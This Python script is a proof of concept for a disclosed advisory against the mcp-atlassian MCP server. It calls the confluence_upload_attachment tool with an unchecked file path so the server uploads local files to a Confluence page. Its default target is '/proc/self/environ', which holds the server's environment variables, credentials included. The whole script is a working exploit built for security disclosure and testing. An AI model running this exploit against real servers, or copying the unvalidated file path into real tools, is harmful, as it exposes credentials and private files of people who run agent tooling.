#!/usr/bin/env python3
"""
PoC: mcp-atlassian arbitrary file read via upload_attachment
GHSA-g5r6-gv6m-f5jv | Patched in v0.22.0

Demonstrates that confluence_upload_attachment passes file_path directly
to open() with no path validation, allowing any file the server process
can read to be exfiltrated to Confluence.

Only test against infrastructure you own or have explicit permission to test.
"""
import asyncio, os, json
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from dotenv import load_dotenv

load_dotenv()

CONFLUENCE_URL       = os.environ["CONFLUENCE_URL"]
CONFLUENCE_USERNAME  = os.environ["CONFLUENCE_USERNAME"]
CONFLUENCE_API_TOKEN = os.environ["CONFLUENCE_API_TOKEN"]
CONTENT_ID           = os.environ["CONTENT_ID"]

# Target file to exfiltrate — change to any path the server process can read.
# On Linux: "/proc/self/environ" leaks all env vars including credentials.
TARGET = "/proc/self/environ"

ENV = {
    "CONFLUENCE_URL":       CONFLUENCE_URL,
    "CONFLUENCE_USERNAME":  CONFLUENCE_USERNAME,
    "CONFLUENCE_API_TOKEN": CONFLUENCE_API_TOKEN,
    "READ_ONLY_MODE":       "false",
}

# Path to mcp-atlassian server binary installed in your venv
SERVER = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                      "venv", "Scripts", "mcp-atlassian")

async def poc():
    params = StdioServerParameters(command=SERVER, args=[], env=ENV)

    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as sess:
            await sess.initialize()

            tools = await sess.list_tools()
            tool_name = next(
                (t.name for t in tools.tools if "upload_attachment" in t.name), None
            )
            if not tool_name:
                print("[-] upload_attachment tool not found")
                return
            print(f"[*] Tool: {tool_name}")
            print(f"[*] Exfiltrating: {TARGET}")

            result = await sess.call_tool(tool_name, {
                "content_id": CONTENT_ID,
                "file_path":  TARGET,
                "comment":    "poc",
            })

            for c in result.content:
                try:
                    data = json.loads(c.text)
                    att = data.get("attachment", data)
                    if att.get("success"):
                        print(f"\n[!!!] CONFIRMED")
                        print(f"      File : {att['filename']}")
                        print(f"      Size : {att['size']} bytes")
                        print(f"      ID   : {att.get('id')}")
                        print(f"\n      Retrieve from Confluence page {CONTENT_ID} > Attachments")
                    else:
                        print(f"[-] {c.text}")
                except Exception:
                    print(c.text)

asyncio.run(poc())
